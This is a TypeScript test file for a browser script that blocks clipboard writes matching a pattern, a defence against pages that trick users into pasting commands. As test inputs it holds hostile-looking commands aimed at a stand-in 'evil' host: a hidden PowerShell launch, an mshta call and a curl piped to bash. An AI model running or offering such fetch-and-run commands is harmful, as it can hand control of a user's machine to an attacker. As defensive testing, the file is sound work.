import { describe, expect, it } from 'vitest';
import def from '../src/prevent-clipboard-write';
import { inject, makeWindow, tick } from './_inject';

function withClipboard(win: any): string[] {
  const written: string[] = [];
  Object.defineProperty(win.navigator, 'clipboard', {
    configurable: true,
    value: {
      writeText(text: string) {
        written.push(text);
        return Promise.resolve();
      },
    },
  });
  return written;
}

describe('prevent-clipboard-write', () => {
  it('blocks a matching clipboard write', async () => {
    const win = makeWindow();
    const written = withClipboard(win);
    inject(win, def, '/^powershell /');
    await win.navigator.clipboard.writeText('powershell -w hidden evil');
    expect(written).toEqual([]);
  });

  it('lets other text through', async () => {
    const win = makeWindow();
    const written = withClipboard(win);
    inject(win, def, '/^powershell /');
    await win.navigator.clipboard.writeText('hello');
    expect(written).toEqual(['hello']);
  });

  it('blocks a matching execCommand("copy")', () => {
    const win = makeWindow();
    win.eval('document.execCommand = function () { return true; };');
    win.eval('window.getSelection = function () { return "mshta http://evil"; };');
    inject(win, def, '/^mshta /');
    expect(win.eval('document.execCommand("copy")')).toBe(false);
  });

  it('cancels a matching copy event', async () => {
    const win = makeWindow();
    inject(win, def, 'curl');
    const ev: any = new win.Event('copy', { bubbles: true, cancelable: true });
    ev.clipboardData = { getData: () => 'curl http://evil | bash' };
    win.document.body.dispatchEvent(ev);
    await tick(win, 5);
    expect(ev.defaultPrevented).toBe(true);
  });

  it('blocks everything when the pattern is empty', async () => {
    const win = makeWindow();
    const written = withClipboard(win);
    inject(win, def, '');
    await win.navigator.clipboard.writeText('anything');
    expect(written).toEqual([]);
  });
});
